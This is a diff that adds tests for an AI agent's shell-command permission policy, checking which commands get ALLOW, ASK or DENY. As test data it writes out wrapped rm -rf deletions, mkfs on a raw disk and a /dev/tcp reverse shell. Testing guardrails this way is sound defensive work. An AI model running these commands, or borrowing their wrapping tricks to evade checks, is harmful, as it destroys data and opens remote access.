@@ -132,6 +132,114 @@ def test_package_shred_dangerous_path_is_ask() -> None:
         assert "shell_fs_recursive_or_forced_delete" in matched, (command, matched)
 
 
+def test_rm_inside_script_argument_is_not_builtin_ask() -> None:
+    cfg = _package_cfg()
+    command = (
+        "bash /c/Users/hanzhibin/.jiuwenswarm/agent/workspace/skills/"
+        "execution-validator-skill/scripts/validate-command.sh "
+        "'ls -la ~/Desktop/a4p_scratch444.txt 2>&1; "
+        "rm -rf ~/Desktop/a4p_scratch444.txt; "
+        'echo "rm exit code: $?"; '
+        "ls -la ~/Desktop/a4p_scratch444.txt 2>&1'"
+    )
+    level, matched = evaluate_tiered_policy(cfg, "bash", {"command": command})
+    assert level == PermissionLevel.ALLOW, (command, matched)
+    assert "shell_fs_recursive_or_forced_delete" not in (matched or "")
+
+
+def test_wrapped_interpreter_and_double_quote_substitution_still_match() -> None:
+    cfg = _package_cfg()
+    ask_cases = (
+        "sudo bash -c 'rm -rf ~/x'",
+        "sudo -u root bash -c 'rm -rf ~/x'",
+        "env bash -c 'rm -rf ~/x'",
+        "ssh host 'rm -rf ~/x'",
+        "docker exec ctr bash -c 'rm -rf ~/x'",
+        "docker exec ctr 'rm -rf /tmp/x'",
+        'echo "$(rm -rf /tmp/x)"',
+        'echo "`rm -rf /tmp/x`"',
+    )
+    for command in ask_cases:
+        level, matched = evaluate_tiered_policy(cfg, "bash", {"command": command})
+        assert level == PermissionLevel.ASK, (command, matched)
+        assert "shell_fs_recursive_or_forced_delete" in matched, (command, matched)
+
+    deny_command = "sudo bash -c 'mkfs.ext4 /dev/sdb1'"
+    level, matched = evaluate_tiered_policy(cfg, "bash", {"command": deny_command})
+    assert level == PermissionLevel.DENY, (deny_command, matched)
+    assert "shell_disk_partition_or_raw_device_write" in matched
+
+    for command in (
+        "echo bash -c 'rm -rf ~/x'",
+        "echo '$(rm -rf /tmp/x)'",
+    ):
+        level, matched = evaluate_tiered_policy(cfg, "bash", {"command": command})
+        assert "shell_fs_recursive_or_forced_delete" not in (matched or ""), (
+            command, matched,
+        )
+        assert level == PermissionLevel.ALLOW, (command, matched)
+
+    level, matched = evaluate_tiered_policy(
+        cfg, "bash", {"command": "sudo echo 'rm -rf ~/x'"},
+    )
+    assert "shell_fs_recursive_or_forced_delete" not in (matched or "")
+    assert "shell_privilege_escalation" in (matched or "")
+
+
+def test_su_pkexec_timeout_and_docker_run_quotes_still_match() -> None:
+    cfg = _package_cfg()
+    ask_cases = (
+        "timeout 5 bash -c 'rm -rf ~/x'",
+        "timeout --signal=KILL 5 sh -c 'rm -rf ~/x'",
+        "pkexec bash -c 'rm -rf ~/x'",
+        "su -c 'rm -rf ~/x'",
+        "su root -c 'rm -rf ~/x'",
+        "docker run --rm alpine sh -c 'rm -rf /tmp/x'",
+        "docker run --rm alpine 'rm -rf /tmp/x'",
+    )
+    for command in ask_cases:
+        level, matched = evaluate_tiered_policy(cfg, "bash", {"command": command})
+        assert level == PermissionLevel.ASK, (command, matched)
+        assert "shell_fs_recursive_or_forced_delete" in matched, (command, matched)
+
+    deny_cases = (
+        "timeout 5 bash -c 'mkfs.ext4 /dev/sdb1'",
+        "su -c 'mkfs.ext4 /dev/sdb1'",
+        "pkexec --user root bash -c 'mkfs.ext4 /dev/sdb1'",
+        "docker run --rm alpine sh -c 'mkfs.ext4 /dev/sdb1'",
+        "timeout --signal=KILL 5 sh -c 'bash -i >& /dev/tcp/10.0.0.1/4444'",
+    )
+    for command in deny_cases:
+        level, matched = evaluate_tiered_policy(cfg, "bash", {"command": command})
+        assert level == PermissionLevel.DENY, (command, matched)
+        assert (
+            "shell_disk_partition_or_raw_device_write" in matched
+            or "shell_reverse_shell_or_bind_shell" in matched
+        ), (command, matched)
+
+    command = "echo timeout 5 bash -c 'rm -rf ~/x'"
+    level, matched = evaluate_tiered_policy(cfg, "bash", {"command": command})
+    assert level == PermissionLevel.ALLOW, (command, matched)
+    assert "shell_fs_recursive_or_forced_delete" not in (matched or "")
+
+
+def test_rm_in_interpreter_payload_and_unquoted_chain_still_asks() -> None:
+    cfg = _package_cfg()
+    cases = (
+        "bash -c 'rm -rf ~/x'",
+        "python -c 'rm -rf ~/x'",
+        'ls -la ~/Desktop/a4p_scratch444.txt 2>&1; '
+        "rm -rf ~/Desktop/a4p_scratch444.txt; "
+        'echo "rm exit code: $?"; '
+        "ls -la ~/Desktop/a4p_scratch444.txt 2>&1",
+        'rm -rf "~/Desktop/a4p_scratch444.txt"',
+    )
+    for command in cases:
+        level, matched = evaluate_tiered_policy(cfg, "bash", {"command": command})
+        assert level == PermissionLevel.ASK, (command, matched)
+        assert "shell_fs_recursive_or_forced_delete" in matched, (command, matched)
+
+
 def test_package_shred_relative_file_is_not_builtin_ask() -> None:
     cfg = _package_cfg()
     for command in ("shred file.txt", "shred notes", "man shred", "echo shred"):
